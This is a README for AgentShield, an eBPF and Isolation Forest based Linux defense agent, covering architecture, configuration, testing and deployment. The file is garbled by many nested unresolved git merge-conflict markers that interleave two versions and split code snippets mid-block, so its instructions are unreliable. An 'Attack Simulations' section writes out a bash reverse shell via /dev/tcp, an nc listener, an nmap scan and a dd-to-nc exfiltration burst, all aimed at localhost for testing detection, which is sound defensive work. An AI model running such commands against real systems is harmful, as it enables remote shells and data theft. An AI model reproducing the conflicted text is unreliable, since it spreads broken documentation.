# AgentShield – Autonomous Agent-Driven Kernel-Level Network Defense System

<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
AgentShield is a production-oriented prototype that captures kernel/network behavior with eBPF, aggregates telemetry into behavioral windows, scores behavior with an Isolation Forest model, and automatically responds with alerts or process termination.

## Architecture

### 1. Kernel Layer (`agentshield/ebpf/monitor.c`)
Short explanation: hooks process execution and network syscalls (`execve`, `connect`, `sendto`, `recvfrom`) and emits compact telemetry records through a perf buffer.

How it connects forward: `loader.py` reads the perf buffer and turns each kernel event into a structured Python dictionary.

### 2. User Space Collector (`agentshield/collector/collector.py`)
Short explanation: loads the eBPF program with BCC, polls perf events asynchronously, serializes them as JSON, and falls back to a synthetic feed if eBPF is unavailable.

How it connects forward: JSON events are streamed into the feature engine via the main pipeline.

### 3. Feature Engine (`agentshield/feature_engine/features.py`)
Short explanation: maintains a per-PID sliding window and produces normalized behavioral features including connection frequency, unique IP count, byte transfer rate, interval variance, and high-risk port ratio.

How it connects forward: each feature vector is passed to the ML engine for anomaly inference.

### 4. ML Engine (`agentshield/ml_engine/model.py`)
Short explanation: wraps a scikit-learn Isolation Forest model, supports bootstrap training, online inference, and offline retraining from JSONL feature datasets.

How it connects forward: inference output feeds the decision engine with an anomaly score and label.

### 5. Decision Engine (`agentshield/decision_engine/decision.py`)
Short explanation: correlates the anomaly score with repeated anomalies, dangerous ports, data spikes, and process protection rules to choose `allow`, `alert`, or `kill`.

How it connects forward: the decision is sent to the response engine for enforcement and auditing.

### 6. Response Engine (`agentshield/response_engine/response.py`)
Short explanation: writes immutable-style audit records, emits console/webhook alerts, and kills unprotected malicious processes.

How it connects forward: response artifacts are persisted to `agentshield/logs/` and used by operators or SIEM tooling.

### 7. Service Layer (`agentshield/service/agentshield.service`)
Short explanation: systemd unit that runs AgentShield as root, restarts it on failure, and constrains filesystem access.

How it connects forward: the service launches `main.py` automatically at boot.

## Project Structure

```text
agentshield/
├── collector/
├── decision_engine/
├── ebpf/
├── feature_engine/
├── logs/
├── ml_engine/
├── response_engine/
└── service/
main.py
requirements.txt
```

## Dependencies

Ubuntu/Debian packages:

```bash
sudo apt-get update
sudo apt-get install -y python3 python3-pip python3-dev bpfcc-tools libbpfcc-dev linux-headers-$(uname -r)
```

Python packages:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
```

## Running the Prototype

### Local execution

```bash
sudo -E python3 main.py --verbose
```

If BCC/eBPF is unavailable, AgentShield automatically switches to a synthetic telemetry mode so the full pipeline can still be exercised.

### Install as a systemd service

```bash
sudo mkdir -p /opt/agentshield
sudo rsync -a ./ /opt/agentshield/
sudo cp agentshield/service/agentshield.service /etc/systemd/system/agentshield.service
sudo systemctl daemon-reload
sudo systemctl enable --now agentshield.service
sudo systemctl status agentshield.service
```

## Retraining the Isolation Forest

Prepare a JSONL file where each row contains the raw feature keys:

```json
{"connection_frequency": 12.3, "unique_ip_count": 4, "byte_transfer_rate": 8200, "interval_variance": 88000000000, "high_risk_port_ratio": 0.2}
```

Then retrain:

```bash
python3 -c "from pathlib import Path; from agentshield.ml_engine.model import AgentShieldModel; AgentShieldModel().retrain_from_jsonl(Path('dataset.jsonl'))"
```

## Attack Simulations

Only run these in an isolated lab or disposable VM.

### 1. Reverse shell

Listener:

```bash
nc -lvnp 4444
```

Simulated outbound shell:

```bash
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
```

### 2. Port scanning

```bash
nmap -Pn -p 1-1024 127.0.0.1
```

### 3. Data exfiltration burst

```bash
dd if=/dev/urandom bs=1K count=256 | nc 127.0.0.1 8080
```

These tests should trigger high-risk port ratios, connection spikes, or byte-transfer anomalies depending on baseline tuning.

## Testing Steps

### Static and unit-style validation

```bash
python3 -m compileall agentshield main.py
python3 - <<'PY'
from agentshield.feature_engine.features import SlidingWindowFeatureEngine
from agentshield.ml_engine.model import AgentShieldModel
from agentshield.decision_engine.decision import DecisionEngine

engine = SlidingWindowFeatureEngine(window_seconds=60, min_events=2)
model = AgentShieldModel()
decision_engine = DecisionEngine(anomaly_threshold=0.2)

events = [
    {"timestamp_ns": 1, "pid": 555, "uid": 1000, "event_type": "connect", "process_name": "python", "destination_ip": "10.0.0.1", "destination_port": 4444, "size": 2048},
    {"timestamp_ns": 2_000_000_000, "pid": 555, "uid": 1000, "event_type": "sendto", "process_name": "python", "destination_ip": "10.0.0.2", "destination_port": 4444, "size": 4096},
=======
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
AgentShield is an industry-oriented Linux defense agent that captures low-level process/network behavior, enriches it with process context, scores it with hybrid ML + signature logic, and autonomously reacts with audit logging, alerts, and optional process termination.

## What's New in This Upgrade

- YAML-driven configuration with hot-reload-aware config management.
- Hybrid signature + anomaly detection.
- Structured JSON event and metrics logging.
- Streamlit dashboard for live visibility.
- New libbpf CO-RE eBPF path with ring-buffer transport, while preserving the BCC fallback path.
- Feature enrichment with PPID, lineage, and command line context.
- Drift detection through anomaly-score mean tracking.

## Updated Architecture

### 1. Config System (`agentshield/config/`)
The runtime is now config-driven through `config.yaml`, loaded by `ConfigManager`, with support for defaulting and reload-on-change behavior.

### 2. eBPF Paths
- `agentshield/ebpf/`: existing BCC path for compatibility.
- `agentshield/ebpf_core/`: new libbpf CO-RE path using a ring buffer and build tooling.

### 3. Collector
The collector now selects CO-RE or BCC based on configuration, enriches events with PPID/cmdline/lineage, and writes structured JSON telemetry logs.

### 4. Feature + ML
The feature engine now includes lineage depth. The ML engine preserves the Isolation Forest pipeline and supports drift-aware metrics analysis around inference.

### 5. Signature + Decision
Signature rules detect reverse-shell ports, suspicious IP ranges, rapid connection bursts, and exfiltration rates. Decision logic now combines signature hits with anomaly scores while respecting protected processes and PIDs.

### 6. Response + Observability
Response records now include integrity hashes. Metrics capture event rate, anomaly rate, action counts, queue drops, and drift warnings.

### 7. Dashboard
A Streamlit dashboard shows recent events, incidents, and metrics directly from JSONL logs.

## Configuration

Default config file: `agentshield/config/config.yaml`

```yaml
anomaly_threshold: 0.2
kill_process: true
use_core_ebpf: false
log_level: INFO
```

## Running AgentShield

### Standard runtime

```bash
python3 main.py
```

### Dashboard

```bash
streamlit run agentshield/dashboard/app.py
```

## Building the CO-RE libbpf Path

Install prerequisites on Linux:

```bash
sudo apt-get update
sudo apt-get install -y clang llvm libbpf-dev libelf-dev zlib1g-dev bpftool gcc make linux-headers-$(uname -r)
```

Build the new CO-RE assets:

```bash
cd agentshield/ebpf_core
make
```

This generates:
- `vmlinux.h`
- `monitor.bpf.o`
- `monitor.skel.h`
- `loader`

Then set `use_core_ebpf: true` in `agentshield/config/config.yaml`.

## Backward Compatibility

- If `use_core_ebpf: false`, AgentShield uses the original BCC path.
- If either BPF loader path is unavailable, AgentShield falls back to synthetic telemetry mode.
- If `scikit-learn` is unavailable, AgentShield uses the built-in fallback Isolation Forest implementation.

## Testing

### Config + signature + decision smoke test

```bash
python3 - <<'PY'
from agentshield.config.settings import ConfigManager
from agentshield.decision_engine.decision import DecisionEngine
from agentshield.feature_engine.features import SlidingWindowFeatureEngine
from agentshield.ml_engine.model import AgentShieldModel
from agentshield.observability.metrics import MetricsTracker
from agentshield.signature_engine.signatures import SignatureEngine

config = ConfigManager().load(force=True)
metrics = MetricsTracker()
engine = SlidingWindowFeatureEngine(window_seconds=60, min_events=2)
model = AgentShieldModel()
signatures = SignatureEngine(config)
decisions = DecisionEngine(config)

events = [
    {"timestamp_ns": 1, "pid": 555, "uid": 1000, "ppid": 123, "event_type": "connect", "process_name": "python", "destination_ip": "10.10.10.5", "destination_port": 4444, "size": 2048, "lineage": ["bash", "python"], "cmdline": "python reverse.py"},
    {"timestamp_ns": 2_000_000_000, "pid": 555, "uid": 1000, "ppid": 123, "event_type": "sendto", "process_name": "python", "destination_ip": "10.10.10.8", "destination_port": 4444, "size": 4096, "lineage": ["bash", "python"], "cmdline": "python reverse.py"},
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
]
feature = None
for event in events:
    feature = engine.ingest(event)
assert feature is not None
inference = model.infer(feature.normalized_features, feature.raw_features)
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
decision = decision_engine.evaluate(feature, inference, events[-1])
print({"inference": inference, "decision": decision})
PY
```

### Runtime smoke test without kernel hooks

```bash
timeout 5 python3 main.py --poll-interval 0.1 --min-events 2 --anomaly-threshold 0.2
```

## Operational Notes

- Tune `--anomaly-threshold` and the normalization statistics to reduce false positives.
- Protected processes are never killed automatically; they are alerted only.
- Logs are written to `agentshield/logs/agentshield.log` and `agentshield/logs/incidents.jsonl` with restrictive permissions where possible.
- For true production deployment, replace the bootstrap baseline with environment-specific clean telemetry and add signed remote alert transport.

## Push / Deploy

The repository can be pushed with standard Git commands after commit:

```bash
git remote -v
git push origin <current-branch>
```

Deployment to your GitHub repository (`https://github.com/Jagannath-22/AGENT_SHIElD`) still requires valid local Git credentials or a configured deploy key/token in the execution environment.
=======
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
signature = signatures.evaluate(events[-1], feature)
decision = decisions.evaluate(feature, inference, events[-1], signature)
metrics.record_inference(inference["anomaly_score"], inference["label"], decision.action)
print({"inference": inference, "signature": signature, "decision": decision, "metrics": metrics.snapshot()})
PY
```

### Runtime smoke test

```bash
timeout 5 python3 main.py
```

### Dashboard smoke test

```bash
python3 -m compileall agentshield main.py
```

## Push / Deploy

```bash
git push origin <branch>
```

If your environment blocks GitHub or lacks credentials, push from a developer workstation with repository access.
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
<<<<<<< ours
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
=======
>>>>>>> theirs
